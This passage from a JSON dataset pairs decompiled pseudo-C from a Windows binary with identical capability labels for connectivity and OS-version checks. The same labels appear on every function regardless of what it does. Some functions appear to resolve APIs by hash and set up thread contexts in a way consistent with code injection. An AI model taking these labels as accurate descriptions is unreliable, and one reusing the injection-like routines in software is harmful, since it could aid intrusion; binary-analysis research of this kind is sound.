        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n\nint32_t __cdecl fcn.00059c80(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_40h;\n    uint32_t var_3ch;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_4h;\n    \n    if (arg_ch != '\\0') {\n        iVar1 = fcn.000785da(arg_8h, 0, &var_1ch, 0x18, 0);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        *arg_10h = var_18h;\n        return (-(*arg_10h != 0) & 0xdea6fffb) + 0x21590005;\n    }\n    var_24h = 0;\n    var_20h = 0;\n    if (arg_8h == -1) {\n        var_24h = -2;\n    }\n    else {\n        var_4h = fcn.00059db0(arg_8h, 0x48, &var_24h);\n        if (var_4h != 0) goto code_r0x00059d8d;\n    }\n    var_4h = fcn.00020280(var_24h, 0, &var_40h, 0x1c, 0);\n    if (var_4h == 0) {\n        if ((var_3ch == 0) || (var_3ch == 0xffffdfd0)) {\n            var_4h = 0x21590005;\n        }\n        else {\n            var_4h = fcn.0005a130(arg_8h, var_3ch + 0x2030, 0xffffdfcf < var_3ch, &var_20h, 4);\n            if (var_4h == 0) {\n                *arg_10h = var_20h;\n                var_4h = (-(*arg_10h != 0) & 0xdea6fffb) + 0x21590005;\n            }\n        }\n    }\ncode_r0x00059d8d:\n    if (var_24h != 0) {\n        fcn.00078544(var_24h);\n    }\n    return var_4h;\n}\n",
        "token_count": 579
    },
    "00059db0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00059db0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    int32_t var_8h;\n    \n    var_40h = NULL;\n    if (arg_10h == 0) {\n        var_24h = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.000785da(arg_8h, 0, &var_18h, 0x18, 0);\n        if (iVar1 == 0) {\n            var_20h = var_8h;\n            var_24h = fcn.00034830(5, &var_40h);\n            if (var_24h == 0) {\n                if (var_40h == NULL) {\n                    var_24h = 0x21590005;\n                }\n                else {\n                    var_24h = 0x21590005;\n                    for (var_1ch = var_40h; var_1ch != NULL; var_1ch = var_1ch + *var_1ch) {\n                        if ((var_1ch[0x11] == var_20h) && (var_1ch[1] != 0)) {\n                            var_3ch = 0x18;\n                            var_38h = 0;\n                            var_30h = 0;\n                            var_34h = 0;\n                            var_2ch = 0;\n                            var_28h = 0;\n                            iVar1 = fcn.00078724(arg_10h, arg_ch, &var_3ch, var_1ch + 0x36);\n                            if (iVar1 == 0) {\n                                var_24h = 0;\n                            }\n                            else {\n                                var_24h = 0x21590008;\n                            }\n                            break;\n                        }\n                        if (*var_1ch == 0) break;\n                    }\n                }\n            }\n        }\n        else {\n            var_24h = 0x21590008;\n        }\n        if (var_40h != NULL) {\n            fcn.00035330(var_40h);\n        }\n    }\n    return var_24h;\n}\n",
        "token_count": 579
    },
    "00059ee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00059ee0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = NULL;\n    if (arg_ch == NULL) {\n        var_10h = 0x21590067;\n    }\n    else {\n        var_10h = fcn.00034830(5, &var_8h);\n        if (var_10h == 0) {\n            var_ch = var_8h;\n            do {\n                if (var_ch[0x11] == arg_8h) break;\n                var_ch = var_ch + *var_ch;\n            } while (*var_ch != 0);\n            if ((var_ch[0x11] == arg_8h) && (var_ch[1] != 0)) {\n                for (var_4h = 0; var_4h < var_ch[1]; var_4h = var_4h + 1) {\n                    *arg_ch = var_ch[var_4h * 0x10 + 0x37];\n                    iVar1 = fcn.0005a110();\n                    if ((arg_8h != iVar1) || (iVar1 = fcn.0005a120(),  *arg_ch != iVar1)) break;\n                }\n                if (var_4h < var_ch[1]) {\n                    var_10h = 0;\n                }\n                else {\n                    var_10h = 0x21590005;\n                }\n            }\n            else {\n                var_10h = 0x21590005;\n            }\n        }\n        fcn.00035330(var_8h);\n    }\n    return var_10h;\n}\n",
        "token_count": 412
    },
    "00059fe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00059fe0(uint arg_8h, uchar *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000785da(arg_8h, 0x1a, &var_4h, 4, 0);\n    if (iVar1 == -0x3ffffffd) {\n        *arg_ch = 0;\n        iVar1 = 0;\n    }\n    else if (iVar1 == 0) {\n        *arg_ch = var_4h != 0;\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 152
    },
    "0005a030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005a030(int32_t arg_8h, uchar *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = 0x21590066;\n    }\n    else if (arg_8h == 0) {\n        *arg_ch = 1;\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00059fe0(arg_8h, &var_1h);\n        if (iVar1 == 0) {\n            if (var_1h == '\\0') {\n                iVar1 = fcn.00059fe0(0xffffffff, &var_1h);\n                if (iVar1 == 0) {\n                    if (var_1h == '\\0') {\n                        *arg_ch = 1;\n                        iVar1 = 0;\n                    }\n                    else {\n                        *arg_ch = 0;\n                        iVar1 = 0;\n                    }\n                }\n            }\n            else {\n                *arg_ch = 1;\n                iVar1 = 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 288
    },
    "0005a0d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a0d0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.0005a2c0(&var_4h, 0x400, arg_8h);\n    if (var_8h == 0) {\n        var_8h = fcn.0005a030(var_4h, arg_ch);\n    }\n    return var_8h;\n}\n",
        "token_count": 117
    },
    "0005a130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a130(int32_t arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_8h == 0) {\n        fcn.0007877e(arg_14h, arg_ch, arg_18h);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.000351a0(arg_8h, arg_ch, arg_14h, arg_18h, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 137
    },
    "0005a170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a170(int32_t arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_8h == 0) {\n        fcn.0007877e(arg_ch, arg_14h, arg_18h);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.000351d0(arg_8h, arg_ch, arg_14h, arg_18h, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 137
    },
    "0005a1b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a1b0(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = 0x21590066;\n    }\n    else if ((arg_10h == NULL) || (*arg_10h == 0)) {\n        iVar1 = 0x21590067;\n    }\n    else if (arg_8h == 0) {\n        iVar1 = fcn.00035230(*arg_10h);\n        *arg_ch = iVar1;\n        iVar1 = (-(*arg_ch != 0) & 0xdea6fffc) + 0x21590004;\n    }\n    else {\n        iVar1 = fcn.0007873c(arg_8h, arg_ch, 0, arg_10h, 0x2000, 0x40);\n        if (iVar1 != 0) {\n            *arg_ch = 0;\n            iVar1 = fcn.0007873c(arg_8h, arg_ch, 0, arg_10h, 0x2000, 0x40);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n        }\n        iVar1 = fcn.0007873c(arg_8h, arg_ch, 0, arg_10h, 0x1000, 0x40);\n    }\n    return iVar1;\n}\n",
        "token_count": 342
    },
    "0005a280": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a280(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.00035330(arg_ch);\n        uVar1 = 0;\n    }\n    else {\n        var_4h = 0;\n        uVar1 = fcn.00078730(arg_8h, &arg_ch, &var_4h, 0x8000);\n    }\n    return uVar1;\n}\n",
        "token_count": 123
    },
    "0005a2c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a2c0(uint *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        uVar1 = 0x21590065;\n    }\n    else if (arg_10h == 0) {\n        *arg_8h = 0;\n        uVar1 = 0;\n    }\n    else {\n        var_20h = 0x18;\n        var_1ch = 0;\n        var_14h = 0x200;\n        var_18h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = arg_10h;\n        var_4h = 0;\n        uVar1 = fcn.000785fe(arg_8h, arg_ch, &var_20h, &var_8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 280
    },
    "0005a360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a360(int32_t arg_8h)\n\n{\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = fcn.00059ee0(*(arg_8h + 0x17), arg_8h + 0x2f);\n    if (var_1ch == 0) {\n        var_18h = 0x18;\n        var_14h = 0;\n        var_ch = 0x200;\n        var_10h = 0;\n        var_8h = 0;\n        var_4h = 0;\n        var_1ch = fcn.0007863a(arg_8h + 0x43, 0x10000000, &var_18h, 0, 0);\n        if (var_1ch == 0) {\n            *(arg_8h + 0x53) = 0;\n            *(arg_8h + 0x57) = 0;\n            *(arg_8h + 0x5b) = 0;\n            *(arg_8h + 0x5f) = 0;\n        }\n    }\n    return var_1ch;\n}\n",
        "token_count": 307
    },
    "0005a400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a400(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = fcn.0001a570(*(arg_8h + 0x17), *(arg_8h + 0x2f), 0, 0, 0xb1c275a0, arg_8h, 0);\n    if (var_8h == 0) {\n        var_10h = -150000000;\n        var_ch = 0xffffffff;\n        var_8h = fcn.000785ec(*(arg_8h + 0x43), 0, &var_10h);\n        if (var_8h == 0x102) {\n            fcn.00036f40(arg_8h + 0x53, 1);\n            var_10h = 100;\n            while ((iVar1 = fcn.0001b770(arg_8h + 0x5b, 0, 0),  iVar1 != 0 && (var_10h != 0))) {\n                fcn.000209a0(100);\n                var_10h = var_10h + -1;\n            }\n            if (var_10h == 0) {\n                *(arg_8h + 0x2b) = 0;\n            }\n        }\n        else {\n            *(arg_8h + 0x2b) = 0;\n        }\n        if (var_8h == 0) {\n            while (iVar1 = fcn.0001b770(arg_8h + 0x5b, 0, 0),  iVar1 != 0) {\n                fcn.000209a0(100);\n            }\n            if ((*(arg_8h + 0x4b) | *(arg_8h + 0x4f)) == 0) {\n                var_8h = -1;\n            }\n            else {\n                var_8h = fcn.000786a6();\n                if ((var_8h == 0) && (var_8h = fcn.00020280(var_4h, 0, &var_2ch, 0x1c, 0),  var_8h == 0)) {\n                    if (var_2ch == 1) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_8h = -0x3fffffff;\n                    }\n                }\n            }\n        }\n    }\n    if (var_4h != 0) {\n        fcn.00078544(var_4h);\n    }\n    fcn.00078544(*(arg_8h + 0x43));\n    return var_8h;\n}\n",
        "token_count": 663
    },
    "0005a5a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0005a5a0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.00036f40(arg_8h + 0x5b, 1);\n        iVar1 = fcn.0001b770(arg_8h + 0x53, 0, 0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0005a8d0(*(arg_8h + 0x17), arg_8h, arg_8h + 0x4b);\n            if (iVar1 == 0) {\n                var_8h = 0xf70f2e80;\n                var_4h = 0xffffffff;\n                iVar1 = fcn.000785ec(*(arg_8h + 0x4b), 0, &var_8h);\n                if (iVar1 != 0) {\n                    fcn.00020140(*(arg_8h + 0x4b), 0);\n                    fcn.00078544(*(arg_8h + 0x4b));\n                    fcn.000209a0(500);\n                    *(arg_8h + 0x4b) = 0;\n                    *(arg_8h + 0x4f) = 0;\n                }\n            }\n            fcn.00078532(*(arg_8h + 0x43), 0);\n            fcn.00036f40(arg_8h + 0x5b, 0);\n        }\n        else {\n            fcn.00036f40(arg_8h + 0x5b, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 404
    },
    "0005a690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a690(uint arg_8h, uint *arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint uVar1;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    arg_ch[2] = 0;\n    arg_ch[3] = 0;\n    arg_ch[4] = 0;\n    if (arg_10h < 0x100000) {\n        var_18h = 0x100000;\n    }\n    else {\n        var_18h = arg_10h;\n    }\n    var_14h = var_18h;\n    arg_ch[4] = 0;\n    var_8h = fcn.0007873c(arg_8h, arg_ch + 4, 0, &var_14h, 0x2000, 4);\n    if (var_8h == 0) {\n        arg_ch[2] = arg_ch[4] + var_14h;\n        if (arg_14h < 0x2000) {\n            var_1ch = 0x2000;\n        }\n        else {\n            var_1ch = arg_14h + 0x1000;\n        }\n        var_ch = var_1ch;\n        if (var_14h <= var_1ch) {\n            var_ch = var_14h - 0x1000;\n        }\n        arg_ch[3] = arg_ch[2] - var_ch;\n        var_8h = fcn.0007873c(arg_8h, arg_ch + 3, 0, &var_ch, 0x1000, 4);\n        if (var_8h == 0) {\n            var_ch = 0x1000;\n            var_10h = arg_ch[3];\n            var_8h = fcn.0001fda0(arg_8h, &var_10h, &var_ch, 0x104, &var_4h);\n        }\n    }\n    if (var_8h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        var_ch = 0;\n        fcn.00078730(arg_8h, arg_ch + 4, &var_ch, 0x8000);\n        uVar1 = fcn.000785b6(var_8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 599
    },
    "0005a7e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a7e0(uint arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t var_4h;\n    \n    fcn.00078790(arg_ch, 0, 0x2cc);\n    *arg_ch = 0x10007;\n    arg_ch[0x23] = 0;\n    arg_ch[0x24] = 0x38;\n    arg_ch[0x25] = 0x20;\n    arg_ch[0x26] = 0x20;\n    arg_ch[0x32] = 0x20;\n    arg_ch[0x2f] = 0x18;\n    arg_ch[0x30] = 0x3000;\n    arg_ch[0x31] = arg_10h + -4;\n    var_4h = fcn.0005a170(arg_8h, arg_ch[0x31], 0, &arg_18h, 4);\n    if (var_4h == 0) {\n        arg_ch[0x31] = arg_ch[0x31] + -4;\n        arg_ch[0x2e] = arg_14h;\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 305
    },
    "0005a8d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005a939)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005a8d0(uint noname_0, int32_t arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_49h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_8ch = 0;\n    var_4h = 0;\n    var_ch = 0;\n    var_84h = 0;\n    var_18h = 0;\n    var_88h = fcn.0005a030(0xffffffff, &var_49h);\n    if ((var_88h == 0) && (var_88h = fcn.0005a690(0xffffffff, &var_28h, 0, 0),  var_88h == 0)) {\n        var_4h = fcn.00035200(0x500);\n        if (var_4h == 0) {\n            var_88h = 0x21590004;\n        }\n        else {\n            var_88h = fcn.0005a7e0(0xffffffff, var_4h, var_20h, *(arg_ch + 0x23), *(arg_ch + 0x33));\n            if (var_88h == 0) {\n                var_44h = 0x18;\n                var_40h = 0;\n                var_38h = 0;\n                var_3ch = 0;\n                var_34h = 0;\n                var_30h = 0;\n                var_88h = fcn.0001ff30(&var_8h, 0x1f03ff, &var_44h, 0xffffffff, &var_14h, var_4h, &var_28h, 1);\n                if (((var_88h == 0) && (var_88h = fcn.00034aa0(var_8h, &var_8ch),  var_88h == 0)) &&\n                   (var_88h = fcn.0005abb0(&var_ch),  var_88h == 0)) {\n                    iVar1 = fcn.00034aa0(var_ch, &var_84h);\n                    if (iVar1 != 0) {\n                        var_84h = var_ch;\n                    }\n                    fcn.00078790(&var_80h, 0, 0x34);\n                    var_80h._2_2_ = 0x34;\n                    var_80h._0_2_ = 0x1c;\n                    var_64h = 0x10001;\n                    var_54h = var_14h;\n                    var_50h = var_10h;\n                    var_58h = var_8h;\n                    var_88h = fcn.0007872a(var_84h, &var_80h, &var_80h);\n                    if (var_88h == 0) {\n                        if (var_60h == 0) {\n                            var_2ch = 0x1f;\n                            fcn.00078736(var_8ch, 2, &var_2ch, 4);\n                            var_88h = fcn.0001fee0(var_8ch, 0);\n                        }\n                        else {\n                            var_88h = var_60h;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.00034af0(var_ch, var_84h);\n    fcn.00035330(var_4h);\n    if (var_88h == 0) {\n        if (arg_10h != NULL) {\n            *arg_10h = var_8h;\n        }\n    }\n    else {\n        if (var_8ch != 0) {\n            fcn.00020140(var_8ch, 0);\n            fcn.00078544(var_8h);\n            fcn.000209a0(500);\n        }\n        if (var_18h != 0) {\n            stack0xffffffb4 = 0;\n            fcn.00078730(0xffffffff, &var_18h, &var_49h + 1, 0x8000);\n        }\n    }\n    fcn.00034af0(var_8h, var_8ch);\n    return var_88h;\n}\n",
        "token_count": 1156
    },
    "0005abb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005abb0(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_284h;\n    uint32_t var_280h;\n    int32_t var_27ch;\n    int32_t var_278h;\n    int32_t var_274h;\n    uint var_270h;\n    uint var_269h;\n    int32_t var_1cch;\n    int32_t var_1c8h;\n    uint *var_1c0h;\n    uint var_ch;\n    char var_5h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_270h = 0;\n    var_280h = 0;\n    var_274h = 0;\n    var_269h._0_1_ = '\\0';\n    var_5h = '\\0';\n    if (arg_8h == NULL) {\n        var_27ch = 0x21590066;\n    }\n    else {\n        uVar1 = fcn.0005a110(0xb1be273c, 0, 1, &var_ch);\n        var_27ch = fcn.00059090(uVar1);\n        if ((var_27ch == 0) && (var_27ch = fcn.0005c850(var_ch, 0xb1be2750, &var_284h),  var_27ch == 0)) {\n            fcn.00060b70(&var_269h + 1);\n            fcn.00060c10(&var_269h + 1, 0x20);\n            var_280h = var_284h;\n            var_278h = 0x1000 - (var_284h & 0xfff);\n            iVar2 = fcn.0001abc0(var_284h, var_278h, 0, &var_4h);\n            if (iVar2 == 0) {\n                var_269h._0_1_ = '\\x01';\n                var_274h = (var_280h & 0xfffff000) + 0x1000;\n                iVar2 = fcn.0001abc0(var_274h, 0x1000, 0, &var_270h);\n                if (iVar2 == 0) {\n                    var_5h = '\\x01';\n                    var_278h = var_278h + 0x1000;\n                }\n                fcn.000607b0(&var_269h + 1, var_284h, var_278h);\n                do {\n                    iVar2 = fcn.00060bb0(&var_269h + 1);\n                    if (iVar2 == 0) goto code_r0x0005ad8a;\n                    if (var_1cch == 0x1be) {\n                        var_27ch = -1;\n                        goto code_r0x0005ad8a;\n                    }\n                } while ((var_1cch != 0x1ad) || (var_1c8h != 0x8d));\n                *arg_8h = *var_1c0h;\n                var_27ch = 0;\ncode_r0x0005ad8a:\n                fcn.000615f0(1);\n            }\n            else {\n                var_27ch = -1;\n            }\n        }\n        if (var_5h != '\\0') {\n            fcn.0001aca0(var_274h, var_270h);\n        }\n        if (var_269h != '\\0') {\n            fcn.0001aca0(var_280h, var_4h);\n        }\n    }\n    return var_27ch;\n}\n",
        "token_count": 839
    },
    "0005ade0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005ade0(int32_t arg_8h)\n\n{\n    int32_t var_4h;\n    \n    *(arg_8h + 0x77) = 1;\n    var_4h = fcn.0005cb50(*(arg_8h + 0x17), *(arg_8h + 0xf), 0xb1bde93c, arg_8h + 0x97);\n    if ((var_4h == 0) && (var_4h = fcn.0005a360(arg_8h),  var_4h == 0)) {\n        *(arg_8h + 0x4b) = 0;\n        *(arg_8h + 0x4f) = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 185
    },
    "0005ae70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005ae70(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_91h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    \n    var_a8h = 0;\n    var_a4h = 0;\n    fcn.00078790(&var_a0h, 0, 0x9f);\n    if (arg_ch == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        var_45h = 0;\n        var_41h = arg_10h;\n        var_3dh = 0;\n        var_39h = arg_14h;\n        var_35h = 0;\n        var_a8h = arg_ch;\n        var_a4h = 0;\n        var_91h = arg_8h;\n        uVar1 = fcn.0005afa0(&var_a8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 280
    },
    "0005af00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005af00(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_91h;\n    uint var_45h;\n    int32_t var_41h;\n    uint var_3dh;\n    uint var_39h;\n    \n    var_a8h = 0;\n    var_a4h = 0;\n    fcn.00078790(&var_a0h, 0, 0x9f);\n    if (arg_ch == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        uVar1 = 0x21590067;\n    }\n    else {\n        var_45h = 1;\n        var_41h = arg_10h;\n        var_3dh = 0;\n        var_39h = arg_14h;\n        var_a8h = arg_ch;\n        var_a4h = 0;\n        var_91h = arg_8h;\n        uVar1 = fcn.0005afa0(&var_a8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 295
    },
    "0005afa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
